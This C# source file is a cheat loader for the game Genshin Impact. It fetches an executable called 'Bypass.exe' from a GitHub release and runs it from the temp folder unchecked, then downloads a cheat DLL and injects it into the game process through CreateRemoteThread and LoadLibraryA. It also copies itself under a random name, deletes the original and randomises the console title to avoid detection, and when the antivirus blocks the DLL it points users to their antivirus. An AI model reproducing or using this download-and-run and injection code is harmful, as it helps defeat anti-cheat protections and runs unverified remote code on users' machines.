using System;
using System.Linq;
using System.Text;
using System.Net;
using System.Runtime.CompilerServices; 
using System.Linq.Expressions;
using Microsoft.CSharp.RuntimeBinder;
using System.IO;
using System.Threading;
using System.Diagnostics;  
using System.Runtime.InteropServices; 
using System.Security.AccessControl;
using Newtonsoft.Json.Linq;
using System.CodeDom.Compiler;
using System.Reflection;
using System.Data;

namespace GenshinPublic
{
    public class Program
    {
		static void Bypass()
		{
			string text = ""; 
			try
			{
				WebClient webClient = new WebClient();
				webClient.Headers.Add(HttpRequestHeader.UserAgent, "Bypass");
				webClient.Proxy = null; 
				string text2 = webClient.DownloadString("https://api.github.com/repos/DeftSolutions-dev/fsfdfddd/releases/latest"); 
				object arg = JObject.Parse(text2);
				int num = 0;
				while (true)
				{
					if (Program.MethodHandle.C1 == null)
					{
						Program.MethodHandle.C1 = CallSite<Func<CallSite, object, bool>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Program), new CSharpArgumentInfo[]
						{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
						}));
					}
					Func<CallSite, object, bool> T = Program.MethodHandle.C1.Target;
					CallSite C = Program.MethodHandle.C1;
					if (Program.MethodHandle.C2 == null)
					{
						Program.MethodHandle.C2 = CallSite<Func<CallSite, object, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.NotEqual, typeof(Program), new CSharpArgumentInfo[]
						{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.Constant, null)
						}));
					}
					Func<CallSite, object, object, object> T2 = Program.MethodHandle.C2.Target;
					CallSite C3 = Program.MethodHandle.C2;
					if (Program.MethodHandle.C3 == null)
					{
						Program.MethodHandle.C3 = CallSite<Func<CallSite, object, int, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetIndex(CSharpBinderFlags.None, typeof(Program), new CSharpArgumentInfo[]
						{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null)
						}));
					}
					Func<CallSite, object, int, object> target3 = Program.MethodHandle.C3.Target;
					CallSite callSite_3 = Program.MethodHandle.C3;
					if (Program.MethodHandle.C4 == null)
					{
						Program.MethodHandle.C4 = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetMember(CSharpBinderFlags.ResultIndexed, "assets", typeof(Program), new CSharpArgumentInfo[]
						{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
						}));
					}
					if (!T(C, T2(C3, target3(callSite_3, Program.MethodHandle.C4.Target(Program.MethodHandle.C4, arg), num), null)))
					{
					}
					if (Program.MethodHandle.C5 == null)
					{
						Program.MethodHandle.C5 = CallSite<Func<CallSite, object, string>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(string), typeof(Program)));
					}
					Func<CallSite, object, string> target4 = Program.MethodHandle.C5.Target;
					CallSite callSite_4 = Program.MethodHandle.C5;
					if (Program.MethodHandle.C6 == null)
					{
						Program.MethodHandle.C6 = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetMember(CSharpBinderFlags.None, "name", typeof(Program), new CSharpArgumentInfo[]
						{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
						}));
					}
					Func<CallSite, object, object> target5 = Program.MethodHandle.C6.Target;
					CallSite callSite_5 = Program.MethodHandle.C6;
					if (Program.MethodHandle.C7 == null)
					{
						Program.MethodHandle.C7 = CallSite<Func<CallSite, object, int, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetIndex(CSharpBinderFlags.None, typeof(Program), new CSharpArgumentInfo[]
						{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null)
						}));
					}
					Func<CallSite, object, int, object> target6 = Program.MethodHandle.C7.Target;
					CallSite callSite_6 = Program.MethodHandle.C7;
					if (Program.MethodHandle.C8 == null)
					{
						Program.MethodHandle.C8 = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetMember(CSharpBinderFlags.ResultIndexed, "assets", typeof(Program), new CSharpArgumentInfo[]
						{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
						}));
					}
					if (target4(callSite_4, target5(callSite_5, target6(callSite_6, Program.MethodHandle.C8.Target(Program.MethodHandle.C8, arg), num))).ToLower().Contains("exe"))
					{
						break;
					}
					num++;
				} 
				if (Program.MethodHandle.C9 == null)
				{
					Program.MethodHandle.C9 = CallSite<Func<CallSite, object, string>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(string), typeof(Program)));
				}
				Func<CallSite, object, string> target7 = Program.MethodHandle.C9.Target;
				CallSite callSite_7 = Program.MethodHandle.C9;
				if (Program.MethodHandle.C10 == null)
				{
					Program.MethodHandle.C10 = CallSite<Func<CallSite, string, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.AddAssign, typeof(Program), new CSharpArgumentInfo[]
					{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				Func<CallSite, string, object, object> target8 = Program.MethodHandle.C10.Target;
				CallSite callSite_8 = Program.MethodHandle.C10;
				if (Program.MethodHandle.C11 == null)
				{
					Program.MethodHandle.C11 = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetMember(CSharpBinderFlags.None, "name", typeof(Program), new CSharpArgumentInfo[]
					{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				if (Program.MethodHandle.C12 == null)
				{
					Program.MethodHandle.C12 = CallSite<Func<CallSite, object, string>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(string), typeof(Program)));
				}
				Func<CallSite, object, string> target9 = Program.MethodHandle.C12.Target;
				CallSite callSite_9 = Program.MethodHandle.C12;
				if (Program.MethodHandle.C13 == null)
				{
					Program.MethodHandle.C13 = CallSite<Func<CallSite, string, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.AddAssign, typeof(Program), new CSharpArgumentInfo[]
					{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				Func<CallSite, string, object, object> target10 = Program.MethodHandle.C13.Target;
				CallSite callSite_10 = Program.MethodHandle.C13;
				if (Program.MethodHandle.C14 == null)
				{
					Program.MethodHandle.C14 = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetMember(CSharpBinderFlags.None, "tag_name", typeof(Program), new CSharpArgumentInfo[]
					{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				text = Path.Combine(Path.GetTempPath(), "Bypass.exe");
				WebClient webClient2 = webClient;
				if (Program.MethodHandle.C15 == null)
				{
					Program.MethodHandle.C15 = CallSite<Func<CallSite, object, string>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(string), typeof(Program)));
				}
				Func<CallSite, object, string> target11 = Program.MethodHandle.C15.Target;
				CallSite callSite_11 = Program.MethodHandle.C15;
				if (Program.MethodHandle.C16 == null)
				{
					Program.MethodHandle.C16 = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetMember(CSharpBinderFlags.None, "browser_download_url", typeof(Program), new CSharpArgumentInfo[]
					{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				Func<CallSite, object, object> target12 = Program.MethodHandle.C16.Target;
				CallSite callSite_12 = MethodHandle.C16;
				if (MethodHandle.C17 == null)
				{
					MethodHandle.C17 = CallSite<Func<CallSite, object, int, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetIndex(CSharpBinderFlags.None, typeof(Program), new CSharpArgumentInfo[]
				   {
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null)
				   }));
				}
				Func<CallSite, object, int, object> target13 = MethodHandle.C17.Target;
				CallSite callSite_13 = MethodHandle.C17;
				if (MethodHandle.C18 == null)
				{
					MethodHandle.C18 = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetMember(CSharpBinderFlags.ResultIndexed, "assets", typeof(Program), new CSharpArgumentInfo[]
				   {
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				   }));
				}
				webClient2.DownloadFileAsync(new Uri(target11(callSite_11, target12(callSite_12, target13(callSite_13, MethodHandle.C18.Target(MethodHandle.C18, arg), num)))), text);
				while (webClient.IsBusy)
				{
					Thread.Sleep(3);
				} 
				string fileName   = Path.Combine(Path.GetTempPath(), "Bypass.exe");
				Process.Start(fileName);
			}
			catch (WebException ex)
			{
				Console.WriteLine(ex.ToString());
				Thread.Sleep(2000);
				return;
			} 
		}
		private static void RandomName()
		{
			Console.Title = "";
			Random rnd = new Random();
			Char[] pwdChars = new Char[36] { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
			for (int i = 20; i < 75; i++)
				Console.Title += pwdChars[rnd.Next(0, 35)];
			Thread.Sleep(10);
		}
		const string Chars = "GhjbHUhuvuyv76giUH87hioH98HIh98iok";
		static string RandomString(int length)
		{
			Random random = new Random();
			return new string(Enumerable.Repeat(Chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
		}
		[STAThread]
		[DebuggerNonUserCode]
		[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
		public static void Main(string[] args)
		{
			RandomName();
			var idx = Array.IndexOf(args, "-parent");
			var currentLoc = Assembly.GetExecutingAssembly().Location;
			var currentDirectory = Path.GetDirectoryName(currentLoc);

			if (idx < 0)
			{
				var newLoc = Path.Combine(currentDirectory, RandomString(21) + ".exe");
				File.Copy(currentLoc, newLoc);
				Process.Start(newLoc, $"-parent {Process.GetCurrentProcess().Id} {Path.GetFileName(currentLoc)}");
				Environment.Exit(0);
			}
			else
			{
				var parentPid = int.Parse(args[idx + 1]);
				var parentLoc = Path.Combine(currentDirectory, args[idx + 2]);

				try
				{
					Process.GetProcessById(parentPid).WaitForExit();
				}
				catch
				{
				}

				File.Delete(parentLoc);
			}
			RandomName();
			Bypass();
			Console.WriteLine("Bypass Anti-Cheat...");
			Thread.Sleep(2000); 
			string text = "";
			bool flag = false; 
			try
			{
				WebClient webClient = new WebClient();
				webClient.Headers.Add(HttpRequestHeader.UserAgent, "FuckYou");
				webClient.Proxy = null;
				Console.WriteLine("Retrieving...");
				Thread.Sleep(200);
				string text2 = webClient.DownloadString("https://api.github.com/repos/DeftSolutions-dev/HackGenshin/releases/latest");
				Console.WriteLine("Parsing...");
				Thread.Sleep(200);
				object arg = JObject.Parse(text2);
				int num = 0; 
				while(true)
				{
					if (Program.MethodHandle.C1 == null)
					{
						Program.MethodHandle.C1 = CallSite<Func<CallSite, object, bool>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Program), new CSharpArgumentInfo[]
						{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
						}));
					}
					Func<CallSite, object, bool> T = Program.MethodHandle.C1.Target;
					CallSite C = Program.MethodHandle.C1;
					if (Program.MethodHandle.C2 == null)
					{
						Program.MethodHandle.C2 = CallSite<Func<CallSite, object, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.NotEqual, typeof(Program), new CSharpArgumentInfo[]
						{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.Constant, null)
						}));
					}
					Func<CallSite, object, object, object> T2 = Program.MethodHandle.C2.Target;
					CallSite C3 = Program.MethodHandle.C2;
					if (Program.MethodHandle.C3 == null)
					{
						Program.MethodHandle.C3 = CallSite<Func<CallSite, object, int, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetIndex(CSharpBinderFlags.None, typeof(Program), new CSharpArgumentInfo[]
						{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null)
						}));
					}
					Func<CallSite, object, int, object> target3 = Program.MethodHandle.C3.Target;
					CallSite callSite_3 = Program.MethodHandle.C3;
					if (Program.MethodHandle.C4 == null)
					{
						Program.MethodHandle.C4 = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetMember(CSharpBinderFlags.ResultIndexed, "assets", typeof(Program), new CSharpArgumentInfo[]
						{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
						}));
					}
					if (!T(C, T2(C3, target3(callSite_3, Program.MethodHandle.C4.Target(Program.MethodHandle.C4, arg), num), null)))
					{ 
					}
					if (Program.MethodHandle.C5 == null)
					{
						Program.MethodHandle.C5 = CallSite<Func<CallSite, object, string>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(string), typeof(Program)));
					}
					Func<CallSite, object, string> target4 = Program.MethodHandle.C5.Target;
					CallSite callSite_4 = Program.MethodHandle.C5;
					if (Program.MethodHandle.C6 == null)
					{
						Program.MethodHandle.C6 = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetMember(CSharpBinderFlags.None, "name", typeof(Program), new CSharpArgumentInfo[]
						{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
						}));
					}
					Func<CallSite, object, object> target5 = Program.MethodHandle.C6.Target;
					CallSite callSite_5 = Program.MethodHandle.C6;
					if (Program.MethodHandle.C7 == null)
					{
						Program.MethodHandle.C7 = CallSite<Func<CallSite, object, int, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetIndex(CSharpBinderFlags.None, typeof(Program), new CSharpArgumentInfo[]
						{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null)
						}));
					}
					Func<CallSite, object, int, object> target6 = Program.MethodHandle.C7.Target;
					CallSite callSite_6 = Program.MethodHandle.C7;
					if (Program.MethodHandle.C8 == null)
					{
						Program.MethodHandle.C8 = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetMember(CSharpBinderFlags.ResultIndexed, "assets", typeof(Program), new CSharpArgumentInfo[]
						{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
						}));
					}
					if (target4(callSite_4, target5(callSite_5, target6(callSite_6, Program.MethodHandle.C8.Target(Program.MethodHandle.C8, arg), num))).ToLower().Contains("dll"))
					{
						break;
					}
					num++;
				}
				Console.WriteLine("Downloading...");
				Thread.Sleep(200);
				if (Program.MethodHandle.C9 == null)
				{
					Program.MethodHandle.C9 = CallSite<Func<CallSite, object, string>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(string), typeof(Program)));
				}
				Func<CallSite, object, string> target7 = Program.MethodHandle.C9.Target;
				CallSite callSite_7 = Program.MethodHandle.C9;
				if (Program.MethodHandle.C10 == null)
				{
					Program.MethodHandle.C10 = CallSite<Func<CallSite, string, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.AddAssign, typeof(Program), new CSharpArgumentInfo[]
					{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				Func<CallSite, string, object, object> target8 = Program.MethodHandle.C10.Target;
				CallSite callSite_8 = Program.MethodHandle.C10; 
				if (Program.MethodHandle.C11 == null)
				{
					Program.MethodHandle.C11 = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetMember(CSharpBinderFlags.None, "name", typeof(Program), new CSharpArgumentInfo[]
					{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				} 
				if (Program.MethodHandle.C12 == null)
				{
					Program.MethodHandle.C12 = CallSite<Func<CallSite, object, string>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(string), typeof(Program)));
				}
				Func<CallSite, object, string> target9 = Program.MethodHandle.C12.Target;
				CallSite callSite_9 = Program.MethodHandle.C12;
				if (Program.MethodHandle.C13 == null)
				{
					Program.MethodHandle.C13 = CallSite<Func<CallSite, string, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.BinaryOperation(CSharpBinderFlags.None, ExpressionType.AddAssign, typeof(Program), new CSharpArgumentInfo[]
					{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				Func<CallSite, string, object, object> target10 = Program.MethodHandle.C13.Target;
				CallSite callSite_10 = Program.MethodHandle.C13;
				if (Program.MethodHandle.C14 == null)
				{
					Program.MethodHandle.C14 = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetMember(CSharpBinderFlags.None, "tag_name", typeof(Program), new CSharpArgumentInfo[]
					{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				} 
				text = Path.Combine(Path.GetTempPath(), "Desire.dll"); 
				WebClient webClient2 = webClient;
				if (Program.MethodHandle.C15 == null)
				{
					Program.MethodHandle.C15 = CallSite<Func<CallSite, object, string>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(string), typeof(Program)));
				}
				Func<CallSite, object, string> target11 = Program.MethodHandle.C15.Target;
				CallSite callSite_11 = Program.MethodHandle.C15;
				if (Program.MethodHandle.C16 == null)
				{
					Program.MethodHandle.C16 = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetMember(CSharpBinderFlags.None, "browser_download_url", typeof(Program), new CSharpArgumentInfo[]
					{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				Func<CallSite, object, object> target12 = Program.MethodHandle.C16.Target;
				CallSite callSite_12 =  MethodHandle.C16;
				if ( MethodHandle.C17 == null)
				{
					 MethodHandle.C17 = CallSite<Func<CallSite, object, int, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetIndex(CSharpBinderFlags.None, typeof(Program), new CSharpArgumentInfo[]
					{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null)
					}));
				}
				Func<CallSite, object, int, object> target13 =  MethodHandle.C17.Target;
				CallSite callSite_13 =  MethodHandle.C17;
				if ( MethodHandle.C18 == null)
				{
					 MethodHandle.C18 = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.GetMember(CSharpBinderFlags.ResultIndexed, "assets", typeof(Program), new CSharpArgumentInfo[]
					{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				webClient2.DownloadFileAsync(new Uri(target11(callSite_11, target12(callSite_12, target13(callSite_13,  MethodHandle.C18.Target( MethodHandle.C18, arg), num)))), text);
				while (webClient.IsBusy)
				{ 
					Thread.Sleep(3);
				}
				Console.WriteLine("Done");
				Thread.Sleep(200);
				if (File.Exists(text) && new FileInfo(text).Length > 200L)
				{
					flag = true;
				}
				else
				{
					Console.WriteLine("Dll could not be downloaded, check your Anti Virus!");
					Thread.Sleep(200);
				} 
			}
			catch (WebException ex)
			{
				Console.WriteLine(ex.ToString());
				Thread.Sleep(200);
				return;
			}
			if (flag)
			{
				Console.WriteLine("Injecting...");
				Thread.Sleep(200);
				string text4 = injectDLL(text);
				if (text4 == "")
				{
					Console.WriteLine("Done = Loader By DesirePro(FUCK#9803)");
					Thread.Sleep(2000);
				}
				else
				{
					Console.WriteLine(text4);
					Console.WriteLine("Loader By DesirePro(FUCK#9803)");
					Thread.Sleep(3500);
				}
			}
		}
		public static string injectDLL(string path)
		{
			string fileName = Path.GetFileName(path);
			Console.WriteLine("Injecting dll hack");
			if (!File.Exists(path))
			{
				return "The dll was deleted before it could be injected\nCheck your antivirus";
				Thread.Sleep(3500);
			}
			if (new FileInfo(path).Length < 100L)
			{
				return "The dll is smaller than 100 bytes\nCheck your antivirus if you think that this is a problem";
				Thread.Sleep(3500);
			}

			try
			{

				var id = Process.GetProcessesByName("GenshinImpact")[0].Id;
				var process = Process.GetProcessesByName("GenshinImpact")[0];
				IntPtr intPtr = OpenProcess(0x001F0FFF, false, id);
				Console.WriteLine("Process Handle: " + intPtr.ToString());
				if (!(intPtr == IntPtr.Zero))
				{
					ProcessModuleCollection modules = process.Modules;
					for (int j = 0; j < modules.Count; j++)
					{
						if (modules[j].ModuleName == fileName)
						{
							return "Dll already injected";
							Thread.Sleep(5500);
						}
					}
					IntPtr procAddress = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
					Console.WriteLine("Load Library Addres: " + procAddress.ToString());
					IntPtr intPtr2 = VirtualAllocEx(intPtr, IntPtr.Zero, (uint)(Encoding.ASCII.GetBytes(path).Length + 1), 12288U, 64U);
					UIntPtr uintPtr;
					if (intPtr2 == IntPtr.Zero)
					{
						Console.WriteLine("Alloc Error " + Marshal.GetLastWin32Error().ToString());
						Thread.Sleep(1500);
					}
					else if (!WriteProcessMemory(intPtr, intPtr2, Encoding.ASCII.GetBytes(path), (uint)(path.Length + 1), out uintPtr))
					{
						Console.WriteLine("Write Error " + Marshal.GetLastWin32Error().ToString());
						Thread.Sleep(1500);
					}
					else
					{
						IntPtr intPtr3 = CreateRemoteThread(intPtr, IntPtr.Zero, 0U, procAddress, intPtr2, 0U, IntPtr.Zero);
						if (intPtr3 == IntPtr.Zero)
						{
							string text = "Access Denied: " + Marshal.GetLastWin32Error().ToString() + "\n Check your antivirus!";
							Console.WriteLine(text);
							return text;
						}
						WaitForSingleObject(intPtr3, 5000);
						DateTime now = DateTime.Now;
						bool flag = false;
						while (now > DateTime.Now.AddSeconds(-5.0))
						{
							DateTime now2 = DateTime.Now;
							while (now > DateTime.Now.AddMilliseconds(-300.0))
							{
								Thread.Sleep(5);
							}
							process.Refresh();
							ProcessModuleCollection modules2 = process.Modules;
							for (int k = 0; k < modules2.Count; k++)
							{
								if (modules2[k].ModuleName == fileName)
								{
									flag = true; 
								}
							}
						} 
						if (!flag)
						{
							CloseHandle(intPtr);
							return "An error occured\nThe DLL was not loaded!\nThis is probably due to your AntiVirus";
							Thread.Sleep(5500);
						}
						Thread.Sleep(1000);
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
			}
			return "";
		}
	

	[DllImport("kernel32.dll")]
		public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
		[DllImport("kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool CloseHandle(IntPtr hObject);
		[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
		public static extern IntPtr GetModuleHandle(string lpModuleName);
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern int WaitForSingleObject(IntPtr Handle, int Wait);
		[CompilerGenerated]
		private static class MethodHandle
		{
			public static CallSite<Func<CallSite, object, object>> C4;
			public static CallSite<Func<CallSite, object, int, object>> C3;
			public static CallSite<Func<CallSite, object, object, object>> C2;
			public static CallSite<Func<CallSite, object, bool>> C1;
			public static CallSite<Func<CallSite, object, object>> C8;
			public static CallSite<Func<CallSite, object, int, object>> C7;
			public static CallSite<Func<CallSite, object, object>> C6;
			public static CallSite<Func<CallSite, object, string>> C5;
			public static CallSite<Func<CallSite, object, object>> C11;
			public static CallSite<Func<CallSite, string, object, object>> C10;
			public static CallSite<Func<CallSite, object, string>> C9;
			public static CallSite<Func<CallSite, object, object>> C14;
			public static CallSite<Func<CallSite, string, object, object>> C13;
			public static CallSite<Func<CallSite, object, string>> C12;
			public static CallSite<Func<CallSite, object, object>> C18;
			public static CallSite<Func<CallSite, object, int, object>> C17;
			public static CallSite<Func<CallSite, object, object>> C16;
			public static CallSite<Func<CallSite, object, string>> C15;
		}
	}
}
